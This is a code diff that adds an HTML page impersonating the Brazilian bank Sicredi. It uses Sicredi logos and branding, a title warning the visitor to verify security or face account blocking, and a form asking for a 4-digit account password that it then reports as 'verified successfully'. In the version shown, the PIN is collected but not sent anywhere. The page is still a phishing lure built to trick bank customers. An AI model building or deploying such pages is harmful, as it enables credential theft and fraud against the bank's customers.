@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sicredi - Verificação de Segurança, evite bloqueio na conta!</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="relative min-h-screen bg-gradient-to-br from-green-900 via-emerald-950 to-black text-slate-100 antialiased overflow-hidden">
+  <!-- Imagem de fundo transparente visível -->
+  <img src="https://www.sicredi.com.br/media/landingpages/geral/sicredi_logo_white.png" alt="Marca Sicredi" class="absolute inset-0 w-full h-full object-contain opacity-10 pointer-events-none select-none" />
+
+  <div class="relative mx-auto max-w-md p-6">
+    <!-- HEADER -->
+    <header class="flex flex-col items-center text-center relative z-10">
+      <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Sicredi_logo.svg" class="w-full max-w-[220px] h-auto object-contain mb-4" />
+      <h1 class="text-xl font-bold">Verificação de Segurança Sicredi</h1>
+      <p class="text-sm text-slate-400">Proteja sua conta contra acessos não autorizados.</p>
+    </header>
+
+    <!-- VERIFICAÇÃO -->
+    <section class="mt-8 bg-white/5 backdrop-blur rounded-2xl border border-white/10 p-6 shadow-xl relative z-10">
+      <h2 class="text-base font-semibold mb-1">Digite a senha</h2>
+      <p class="text-sm text-slate-400 mb-4">Digite a senha de 4 dígitos para validar a sessão atual.</p>
+
+      <form id="formPin" class="space-y-4" novalidate>
+        <div class="flex items-center justify-center gap-3">
+          <input inputmode="numeric" maxlength="1" class="pin digit w-14 h-14 rounded-2xl bg-green-900 text-center text-2xl font-semibold border border-white/10 focus:outline-none focus:ring-2 focus:ring-green-400" />
+          <input inputmode="numeric" maxlength="1" class="pin digit w-14 h-14 rounded-2xl bg-green-900 text-center text-2xl font-semibold border border-white/10 focus:outline-none focus:ring-2 focus:ring-green-400" />
+          <input inputmode="numeric" maxlength="1" class="pin digit w-14 h-14 rounded-2xl bg-green-900 text-center text-2xl font-semibold border border-white/10 focus:outline-none focus:ring-2 focus:ring-green-400" />
+          <input inputmode="numeric" maxlength="1" class="pin digit w-14 h-14 rounded-2xl bg-green-900 text-center text-2xl font-semibold border border-white/10 focus:outline-none focus:ring-2 focus:ring-green-400" />
+        </div>
+        <div class="flex justify-between text-xs text-slate-400">
+          <span id="pinEstado">Aguardando Senha…</span>
+          <button id="limparPin" type="button" class="underline hover:text-slate-200">Limpar</button>
+        </div>
+        <button id="enviarPin" type="submit" disabled class="w-full rounded-2xl bg-green-600/80 hover:bg-green-600 disabled:opacity-40 py-3 font-semibold shadow-lg shadow-green-900/40">Validar Código</button>
+      </form>
+    </section>
+
+    <!-- RODAPÉ -->
+    <footer class="mt-8 text-center text-xs text-slate-500 relative z-10">
+      <p>© <span id="ano"></span> Todos os direitos reservados ao Sicredi.</p>
+    </footer>
+  </div>
+
+  <script>
+    document.getElementById('ano').textContent = new Date().getFullYear();
+
+    const inputs = Array.from(document.querySelectorAll('.pin.digit'));
+    const enviarBtn = document.getElementById('enviarPin');
+    const limparBtn = document.getElementById('limparPin');
+    const estado = document.getElementById('pinEstado');
+
+    function getPIN() { return inputs.map(i => i.value).join(''); }
+    function updateState() {
+      const pin = getPIN();
+      const completo = pin.length === 4 && /^\d{4}$/.test(pin);
+      enviarBtn.disabled = !completo;
+      estado.textContent = completo ? 'Código pronto para validar.' : 'Aguardando código…';
+    }
+
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', (e) => {
+        const v = e.target.value.replace(/\D/g, '');
+        e.target.value = v.slice(0,1);
+        if (v && idx < inputs.length - 1) inputs[idx + 1].focus();
+        updateState();
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx - 1].focus();
+      });
+    });
+
+    limparBtn.addEventListener('click', () => {
+      inputs.forEach(i => i.value = '');
+      inputs[0].focus();
+      updateState();
+    });
+
+    document.getElementById('formPin').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const pin = getPIN();
+      estado.textContent = 'Validando…';
+      enviarBtn.disabled = true;
+      setTimeout(() => {
+        estado.textContent = /^\d{4}$/.test(pin) ? 'Código verificado com sucesso.' : 'Código inválido.';
+        updateState();
+      }, 600);
+    });
+  </script>
+</body>
+</html>
